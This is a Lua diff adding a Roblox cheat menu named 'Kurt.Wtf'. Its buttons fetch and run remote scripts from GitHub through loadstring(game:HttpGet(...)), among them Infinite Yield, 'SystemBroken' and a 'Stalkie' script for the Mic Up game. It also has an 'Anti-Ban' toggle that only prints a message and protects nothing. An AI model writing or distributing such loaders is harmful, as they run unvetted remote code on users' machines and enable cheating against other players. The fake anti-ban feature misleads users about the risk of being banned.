@@ -1,0 +1,230 @@
+-- UI Libraries
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local ContextActionService = game:GetService("ContextActionService")
+local player = Players.LocalPlayer
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "InformantStyleUI"
+screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false
+
+-- Main Frame (initially black & transparent for fade-in)
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 500, 0, 400)
+main.Position = UDim2.new(0.5, -250, 0.5, -200)
+main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+main.BorderColor3 = Color3.fromRGB(255, 0, 0)
+main.BorderSizePixel = 2
+main.Parent = screenGui
+main.BackgroundTransparency = 1
+main.Active = true
+main.Draggable = true
+
+-- Fade-in effect
+TweenService:Create(main, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+BackgroundColor3 = Color3.fromRGB(20, 20, 20),
+BackgroundTransparency = 0
+}):Play()
+
+-- Title Bar
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Text = "Kurt.Wtf"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+title.BorderColor3 = Color3.fromRGB(255, 0, 0)
+title.BorderSizePixel = 1
+title.Parent = main
+
+-- Tab Buttons
+local function createTabButton(text, position)
+local btn = Instance.new("TextButton")
+btn.Text = text
+btn.Size = UDim2.new(0, 100, 0, 25)
+btn.Position = position
+btn.Font = Enum.Font.GothamBold
+btn.TextSize = 14
+btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+btn.BorderColor3 = Color3.fromRGB(255, 0, 0)
+btn.Parent = main
+return btn
+end
+
+local tab1 = createTabButton("Mic up", UDim2.new(0, 10, 0, 35))
+local settingsTab = createTabButton("Settings", UDim2.new(0, 120, 0, 35))
+local universalTab = createTabButton("Universal", UDim2.new(0, 230, 0, 35))
+
+-- Tab Content Frames
+local function createTabFrame()
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, -20, 1, -70)
+frame.Position = UDim2.new(0, 10, 0, 65)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+frame.Visible = false
+frame.Parent = main
+return frame
+end
+
+local tab1Frame = createTabFrame()
+tab1Frame.Visible = true
+local settingsFrame = createTabFrame()
+local universalFrame = createTabFrame()
+
+-- Section1 & Section2 for tab1
+local section1 = Instance.new("Frame")
+section1.Size = UDim2.new(0.5, -5, 1, 0)
+section1.BackgroundTransparency = 1
+section1.Position = UDim2.new(0, 0, 0, 0)
+section1.Parent = tab1Frame
+
+local section2 = section1:Clone()
+section2.Position = UDim2.new(0.5, 5, 0, 0)
+section2.Parent = tab1Frame
+
+-- Anti-Ban Toggle
+local toggle = Instance.new("TextButton")
+toggle.Size = UDim2.new(0, 200, 0, 30)
+toggle.Position = UDim2.new(0, 10, 0, 10)
+toggle.Text = "Anti-Ban: OFF"
+toggle.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+toggle.TextColor3 = Color3.fromRGB(255, 80, 80)
+toggle.Font = Enum.Font.GothamBold
+toggle.TextSize = 14
+toggle.BorderColor3 = Color3.fromRGB(255, 0, 0)
+toggle.Parent = section1
+
+local antiBanEnabled = false
+toggle.MouseButton1Click:Connect(function()
+antiBanEnabled = not antiBanEnabled
+toggle.Text = "Anti-Ban: " .. (antiBanEnabled and "ON" or "OFF")
+toggle.BackgroundColor3 = antiBanEnabled and Color3.fromRGB(0, 100, 0) or Color3.fromRGB(40, 0, 0)
+if antiBanEnabled then
+print("Anti-ban activated")
+end
+end)
+
+-- Execute MicUp Button
+local executeBtn = toggle:Clone()
+executeBtn.Position = UDim2.new(0, 10, 0, 50)
+executeBtn.Text = "Execute MicUp"
+executeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+executeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+executeBtn.Parent = section1
+
+executeBtn.MouseButton1Click:Connect(function()
+local micUpCode = [[repeat task.wait() until game.Players.LocalPlayer
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0riginalWarrior/Stalkie/refs/heads/main/roblox.lua"))()]]
+loadstring(micUpCode)()
+end)
+
+-- Execute AntiVoid Button
+local voidBtn = toggle:Clone()
+voidBtn.Position = UDim2.new(0, 10, 0, 90)
+voidBtn.Text = "Execute AntiVoid"
+voidBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+voidBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+voidBtn.Parent = section1
+
+voidBtn.MouseButton1Click:Connect(function()
+local voidCode = [[loadstring(game:HttpGet(('https://raw.githubusercontent.com/SlammedByCleetus/antivoid-for-mic-up-Roblox/refs/heads/main/AntiVoid.lua')))()]]
+loadstring(voidCode)()
+end)
+
+-- Execute Universal Buttons
+local universalBtn1 = Instance.new("TextButton")
+universalBtn1.Size = UDim2.new(0, 200, 0, 30)
+universalBtn1.Position = UDim2.new(0, 10, 0, 10)
+universalBtn1.Text = "Infinite Yield"
+universalBtn1.Font = Enum.Font.GothamBold
+universalBtn1.TextSize = 14
+universalBtn1.TextColor3 = Color3.fromRGB(255, 255, 255)
+universalBtn1.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+universalBtn1.BorderColor3 = Color3.fromRGB(255, 0, 0)
+universalBtn1.Parent = universalFrame
+
+universalBtn1.MouseButton1Click:Connect(function()
+local script1 = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()]]
+loadstring(script1)()
+end)
+
+local universalBtn2 = universalBtn1:Clone()
+universalBtn2.Position = UDim2.new(0, 10, 0, 50)
+universalBtn2.Text = "SystemBroken"
+universalBtn2.Parent = universalFrame
+
+universalBtn2.MouseButton1Click:Connect(function()
+local script2 = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()]]
+loadstring(script2)()
+end)
+
+-- Settings: Minimize Keybind Input
+local keyLabel = Instance.new("TextLabel")
+keyLabel.Size = UDim2.new(0, 120, 0, 25)
+keyLabel.Position = UDim2.new(0, 10, 0, 10)
+keyLabel.Text = "Set Minimize Key:"
+keyLabel.Font = Enum.Font.Gotham
+keyLabel.TextSize = 14
+keyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+keyLabel.BackgroundTransparency = 1
+keyLabel.Parent = settingsFrame
+
+local keyBox = Instance.new("TextBox")
+keyBox.Size = UDim2.new(0, 100, 0, 25)
+keyBox.Position = UDim2.new(0, 140, 0, 10)
+keyBox.PlaceholderText = "Press key"
+keyBox.Font = Enum.Font.GothamBold
+keyBox.TextSize = 14
+keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+keyBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+keyBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
+keyBox.ClearTextOnFocus = false
+keyBox.TextEditable = false
+keyBox.Text = "Return"
+keyBox.Parent = settingsFrame
+
+local minimizeKey = Enum.KeyCode.Return
+
+keyBox.Focused:Connect(function()
+keyBox.Text = "[Press Any Key]"
+local conn
+conn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+if not gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard then
+minimizeKey = input.KeyCode
+keyBox.Text = minimizeKey.Name
+conn:Disconnect()
+keyBox:ReleaseFocus()
+end
+end)
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+if not gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == minimizeKey then
+main.Visible = not main.Visible
+end
+end)
+
+-- Tab Switching Logic
+tab1.MouseButton1Click:Connect(function()
+tab1Frame.Visible = true
+settingsFrame.Visible = false
+universalFrame.Visible = false
+end)
+
+settingsTab.MouseButton1Click:Connect(function()
+tab1Frame.Visible = false
+settingsFrame.Visible = true
+universalFrame.Visible = false
+end)
+
+universalTab.MouseButton1Click:Connect(function()
+tab1Frame.Visible = false
+settingsFrame.Visible = false
+universalFrame.Visible = true
+end)
+
